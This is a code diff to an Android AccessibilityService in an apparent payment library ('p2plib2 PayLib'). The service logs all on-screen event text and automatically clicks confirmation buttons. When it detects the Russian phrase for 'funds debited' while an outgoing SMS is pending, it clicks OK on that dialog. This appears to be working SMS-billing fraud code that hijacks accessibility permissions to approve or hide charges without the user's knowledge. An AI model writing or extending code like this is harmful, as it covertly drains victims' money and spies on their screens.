@@ -15,7 +15,7 @@ import com.p2plib2.PayLib;
 
 import static com.p2plib2.PayLib.curSMSOut;
 import static com.p2plib2.PayLib.feedback;
-import static com.p2plib2.PayLib.flagok;
+import static com.p2plib2.PayLib.serviceActivation;
 
 public class AccessService extends AccessibilityService {
 
@@ -32,7 +32,7 @@ public class AccessService extends AccessibilityService {
                 "onAccessibilityEvent: [type] %s [class] %s [package] %s [time] %s [text] %s",
                 event.getEventType(), event.getClassName(), event.getPackageName(),
                 event.getEventTime(), event.getText()));
-        if (flagok || com.p2plib2.Simple.PayLib.flagok) {
+        if (serviceActivation) {
             this.event = event;
             Logger.lg(String.format(
                     "onAccessibilityEvent: [type] %s [class] %s [package] %s [time] %s [text] %s",
@@ -87,16 +87,16 @@ public class AccessService extends AccessibilityService {
             for (int i = 0; i < event.getText().size() - 1; i++) {
                 str += event.getText().get(1).toString().toLowerCase();
             }
-            PayLib.feedback.callResult("Code P2P-004: " + str);
-            Logger.lg("curSMSOut " + curSMSOut);
-            if ((PayLib.currentMsg!= null || curSMSOut != null || PayLib.currentMsg != null || com.p2plib2.Simple.PayLib.currentMsg != null) && str.contains("списаны средства")) {
-                Logger.lg("PayLib.curSMSOut");
-                clickOnButtonOK(event, 0);
-                PayLib.curMesage.clear();
-                com.p2plib2.Simple.PayLib.curMesage.clear();
-                curSMSOut = null;
-                PayLib.currentMsg = null;
-                com.p2plib2.Simple.PayLib.currentMsg = null;
+            if(PayLib.feedback!=null){
+                PayLib.feedback.callResult("Code P2P-004: " + str);
+                Logger.lg("curSMSOut " + curSMSOut);
+                if ((PayLib.currentMsg!= null || curSMSOut != null || PayLib.currentMsg != null) && str.contains("списаны средства")) {
+                    Logger.lg("PayLib.curSMSOut");
+                    clickOnButtonOK(event, 0);
+                    //PayLib.currentMessages.clear();
+                    curSMSOut = null;
+                   // PayLib.currentMsg = null;
+                }
             }
         } else {
             Logger.lg("str " + event.getText()
@@ -208,7 +208,7 @@ public class AccessService extends AccessibilityService {
      * @param index button's index
      */
     protected static void clickOnButton(AccessibilityEvent event, int index) {
-        Logger.lg("clickOnButton " + event.getSource() + " flag " + flagok + " " + com.p2plib2.Simple.PayLib.flagok);
+        Logger.lg("clickOnButton " + event.getSource() + " flag " + serviceActivation);
         if (event.getSource() != null) {
             int count = -1;
             Logger.lg("event.getSource().getChildCount() " + event.getSource().getChildCount());
@@ -239,8 +239,7 @@ public class AccessService extends AccessibilityService {
                                     nodeButton.getChild(k).performAction(AccessibilityNodeInfo.ACTION_CLICK);
                                 }
                                 if (curSMSOut != null) {
-                                    flagok = false;
-                                    com.p2plib2.Simple.PayLib.flagok = false;
+                                    serviceActivation = false;
                                     PayLib.checkSmsAdditional();
                                 }
                             }
@@ -253,7 +252,7 @@ public class AccessService extends AccessibilityService {
     }
 
     protected static void clickOnButtonOK(AccessibilityEvent event, int index) {
-        Logger.lg("clickOnButton " + event.getSource() + " flag " + flagok + " " + com.p2plib2.Simple.PayLib.flagok);
+        Logger.lg("clickOnButton " + event.getSource() + " flag " + serviceActivation);
         if (event.getSource() != null) {
             Logger.lg("event.getSource().getChildCount() " + event.getSource().getChildCount());
             boolean m = false;
